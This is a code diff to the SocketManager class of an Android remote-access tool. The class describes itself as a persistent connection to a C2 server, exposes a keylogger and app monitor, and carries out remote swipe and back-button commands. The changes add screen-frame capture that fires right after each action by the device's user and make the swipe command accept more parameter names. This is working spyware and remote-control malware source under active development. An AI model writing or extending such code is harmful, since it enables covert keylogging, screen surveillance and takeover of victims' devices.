@@ -22,6 +22,7 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.ScheduledFuture;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicReference;
 
 /**
  * SocketManager — persistent TCP connection to the C2 server.
@@ -50,6 +51,9 @@ public class SocketManager {
     // Streaming state — event-driven (single-frame on request, idle keepalive)
     private volatile boolean idleFrameMode = false;
     private ScheduledFuture<?> idleFrameFuture;
+
+    // Debounce handle for device-user interaction frames
+    private final AtomicReference<ScheduledFuture<?>> actionFrameFuture = new AtomicReference<>();
 
     // Dynamic monitored packages (runtime additions from dashboard)
     private final java.util.Set<String> dynamicMonitoredPackages = new java.util.concurrent.CopyOnWriteArraySet<>();
@@ -94,6 +98,22 @@ public class SocketManager {
     /** Expose appMonitor so UnifiedAccessibilityService can call it. */
     public AppMonitor getAppMonitor()       { return appMonitor; }
     public KeyloggerService getKeylogger()  { return keyloggerService; }
+
+    /** Whether streaming is currently active (idle-frame mode on). */
+    public boolean isStreamingActive() { return idleFrameMode && connected; }
+
+    /**
+     * Schedule a frame capture 200 ms after the last device-user interaction.
+     * Resets the timer on each call so rapid interactions produce only one frame.
+     */
+    public void scheduleFrameAfterAction(String deviceId) {
+        if (!isStreamingActive()) return;
+        ScheduledFuture<?> prev = actionFrameFuture.getAndSet(null);
+        if (prev != null) prev.cancel(false);
+        ScheduledFuture<?> next = heartbeatExecutor.schedule(
+            () -> sendSingleFrame(deviceId), 200, TimeUnit.MILLISECONDS);
+        actionFrameFuture.set(next);
+    }
 
     // ── Connection lifecycle ──────────────────────────────────────────────
 
@@ -681,8 +701,10 @@ public class SocketManager {
                     );
                 case "swipe":
                     return sc.swipe(
-                        params.getInt("startX"), params.getInt("startY"),
-                        params.getInt("endX"),   params.getInt("endY"),
+                        params.optInt("x1", params.optInt("startX", 0)),
+                        params.optInt("y1", params.optInt("startY", 0)),
+                        params.optInt("x2", params.optInt("endX", 0)),
+                        params.optInt("y2", params.optInt("endY", 0)),
                         params.optInt("duration", 300)
                     );
                 case "press_back":         return sc.pressBack();
